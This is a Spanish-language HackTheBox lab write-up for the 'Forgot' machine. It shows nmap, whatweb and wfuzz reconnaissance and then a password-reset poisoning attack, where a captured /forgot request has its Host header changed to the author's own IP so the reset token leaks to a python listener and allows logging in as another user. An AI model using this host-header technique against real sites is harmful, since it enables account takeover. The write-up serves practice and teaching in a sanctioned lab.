---
title: Forgot Writeup
author: miguel3023
date: 2022-11-19
categories: [Writeup, HTB]
tags: [Linux, CTF, Medium]
image:
  path: ../../assets/img/commons/Forgot/Forgot.png
  width: 800
  height: 450 
---

## Reconocimiento

Primeramente realizamos un escaneo con nmap para detectar los puertos abiertos

```
❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.10.11.188 -oG OpenPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 00:34 -05
Initiating SYN Stealth Scan at 00:34
Scanning 10.10.11.188 [65535 ports]
Discovered open port 80/tcp on 10.10.11.188
Discovered open port 22/tcp on 10.10.11.188
Completed SYN Stealth Scan at 00:34, 13.78s elapsed (65535 total ports)
Nmap scan report for 10.10.11.188
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Con **whatweb** podemos ver qué tecnologías emplea la web que hay en el puerto 80

```
❯ whatweb http://10.10.11.188
http://10.10.11.188 [503 Service Unavailable] Country[RESERVED][ZZ], HTML5, HTTPServer[Varnish], IP[10.10.11.188], Title[503 Backend fetch failed], UncommonHeaders[retry-after,x-varnish], Varnish, Via-Proxy[1.1 varnish (Varnish/6.2)]

```

Luego con nmap detectamos la versión y los servicios que están en los puertos que encontramos previamente abiertos

```
❯ nmap -sC -sV -p22,80 10.10.11.188 -oN Versions
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 00:55 -05
Nmap scan report for 10.10.11.188
Host is up (0.11s latency).

PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http-proxy Varnish http accelerator
|_http-title: 503 Backend fetch failed
|_http-server-header: Varnish
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ahora fuzzeamos por directorios a ver qué encontramos.

`Nota:` Nos tiene que aparecer un panel de login en la propia web, si no te aparece reinicia la máquina (me sucedió por eso lo menciono)

```
❯ wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.188/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                       
=====================================================================

000000001:   200        245 L    484 W      5186 Ch     "# directory-list-2.3-medium.txt"                                             
000000007:   200        245 L    484 W      5186 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"             
000000008:   200        245 L    484 W      5186 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                  
000000003:   200        245 L    484 W      5186 Ch     "# Copyright 2007 James Fisher"                                               
000000010:   200        245 L    484 W      5186 Ch     "#"                                                                           
000000005:   200        245 L    484 W      5186 Ch     "# This work is licensed under the Creative Commons"                          
000000014:   200        245 L    484 W      5186 Ch     "http://10.10.11.188/"                                                        
000000006:   200        245 L    484 W      5186 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"               
000000002:   200        245 L    484 W      5186 Ch     "#"                                                                           
000000004:   200        245 L    484 W      5186 Ch     "#"                                                                           
000000013:   200        245 L    484 W      5186 Ch     "#"                                                                           
000000009:   200        245 L    484 W      5186 Ch     "# Suite 300, San Francisco, California, 94105, USA."                         
000000012:   200        245 L    484 W      5186 Ch     "# on atleast 2 different hosts"                                              
000000011:   200        245 L    484 W      5186 Ch     "# Priority ordered case sensative list, where entries were found"            
000000038:   302        5 L      22 W       189 Ch      "home"                                                                        
000000053:   200        245 L    484 W      5189 Ch     "login"                                                                       
000001706:   200        252 L    498 W      5227 Ch     "forgot"                                                                      
000002357:   302        5 L      22 W       189 Ch      "tickets"                    

```
## Intrusión

En en código fuente podemos ver un usuario potencial

```html
<!-- Q1 release fix by robert-dev-145092 -->
```
Nos montamos un servidor con python por el puerto 80

```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ahora en la ruta **/forgot** que encontramos anteriormente colocamos el usuario que vimos. Realizamos la petición y capturamos la petición con Burpsuite y cambiamos el HOST por nuestra ip y el puerto donde tenemos el servidor

```
GET /forgot?username=robert-dev-145092 HTTP/1.1
Host: 10.10.16.47:80
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.11.188/forgot
```
Ahora interceptamos la petición de **/reset** colocando el token que nos dio de manera urlencodeada para luego iniciar sesión como **robert-dev-145092**. (Si no te funciona el token a la primera, intenta nuevamente con otro token que te da si te quedaste en escucha con python)

![Burpsuite]({{ 'assets/img/commons/Forgot/Burp.png' | relative_url }}){: .center-image }
_Petición por Burp_ 
